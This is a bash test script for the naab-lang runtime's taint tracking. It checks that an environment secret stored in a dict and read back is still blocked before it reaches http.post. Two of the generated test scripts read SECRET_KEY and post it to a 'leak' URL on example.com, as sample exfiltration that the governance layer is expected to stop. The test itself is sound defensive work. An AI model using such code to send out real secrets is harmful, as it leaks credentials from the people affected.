#!/usr/bin/env bash
# test_container_taint_vm003.sh — V-VM-003: taint must survive dict/list container mutation
set -euo pipefail

NAAB="${1:-$(dirname "$0")/../../build/naab-lang}"
PASS=0; FAIL=0

ok()   { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

# Use a single work directory for both scripts AND govern.json.
# naab auto-discovers govern.json by walking up from the script file's directory,
# so governance config must be co-located with (or above) the script files.
WORK_DIR="${HOME}/.naab/vm003_$$"
mkdir -p "$WORK_DIR"
cleanup() { rm -rf "$WORK_DIR"; }
trap cleanup EXIT

# ---------------------------------------------------------------------------
# Governance config: env.get is a taint source, http.post is a sink
# ---------------------------------------------------------------------------
cat > "$WORK_DIR/govern.json" <<'EOF'
{
  "mode": "HARD",
  "taint_sources": ["env.get"],
  "sinks": ["http.post"]
}
EOF

echo "=== test_container_taint_vm003.sh ==="
echo ""

# ---------------------------------------------------------------------------
# T1: tainted env.get → stored in dict → read from dict → http.post → BLOCKED
# ---------------------------------------------------------------------------
echo "[T1] Tainted value stored in dict, read back, passed to http.post — must be blocked"
cat > "$WORK_DIR/vm003_t1.naab" <<'NAAB'
use env
use http
main {
    let secret = env.get("SECRET_KEY")
    let d = {}
    d["k"] = secret
    let x = d["k"]
    http.post("http://example.com/leak", x)
}
NAAB

out=$("$NAAB" "$WORK_DIR/vm003_t1.naab" 2>&1 || true)
if echo "$out" | grep -qi "taint\|sink\|blocked\|governance.*error\|denied\|violation"; then
    ok "taint propagated through dict — http.post blocked"
else
    fail "expected taint block, got: $out"
fi

echo ""

# ---------------------------------------------------------------------------
# T2: clean value stored and read from dict → http.post must NOT be blocked
# ---------------------------------------------------------------------------
echo "[T2] Clean value stored in dict, read back, passed to http.post — must NOT be blocked"
cat > "$WORK_DIR/vm003_t2.naab" <<'NAAB'
use http
main {
    let clean = "hello"
    let d = {}
    d["k"] = clean
    let x = d["k"]
    http.post("http://example.com/ok", x)
}
NAAB

out=$("$NAAB" "$WORK_DIR/vm003_t2.naab" 2>&1 || true)
if echo "$out" | grep -qi "taint.*violat\|taint.*block\|sink.*taint\|tainted.*denied"; then
    fail "false positive — clean dict read blocked: $out"
else
    ok "clean dict read not blocked (no false positive)"
fi

echo ""

# ---------------------------------------------------------------------------
# T3: same as T1 but --no-governance → must run without error
# ---------------------------------------------------------------------------
echo "[T3] Taint scenario with --no-governance — must not block"
cat > "$WORK_DIR/vm003_t3.naab" <<'NAAB'
use env
main {
    let secret = env.get("SECRET_KEY")
    let d = {}
    d["k"] = secret
    let x = d["k"]
    print("no-gov: " + string(x))
}
NAAB

SECRET_KEY="s3cr3t" out=$("$NAAB" --no-governance "$WORK_DIR/vm003_t3.naab" 2>&1 || true)
if echo "$out" | grep -qi "governance.*error\|taint.*block\|violation"; then
    fail "governance fired with --no-governance: $out"
else
    ok "no-governance: ran without governance error"
fi

echo ""

# ---------------------------------------------------------------------------
# T4: tainted value stored via dict.put(), read via dict.get() → http.post → BLOCKED
# ---------------------------------------------------------------------------
echo "[T4] Tainted value via dict.put()/dict.get() — must be blocked"
cat > "$WORK_DIR/vm003_t4.naab" <<'NAAB'
use env
use http
main {
    let secret = env.get("SECRET_KEY")
    let d = {}
    d.put("k", secret)
    let x = d.get("k")
    http.post("http://example.com/leak", x)
}
NAAB

out=$("$NAAB" "$WORK_DIR/vm003_t4.naab" 2>&1 || true)
if echo "$out" | grep -qi "taint\|sink\|blocked\|governance.*error\|denied\|violation"; then
    ok "taint propagated through dict.put/get — http.post blocked"
else
    fail "expected taint block via put/get, got: $out"
fi

echo ""
TOTAL=$(( PASS + FAIL ))
echo "Results: ${PASS}/${TOTAL} passed"
if [[ "$FAIL" -gt 0 ]]; then exit 1; fi
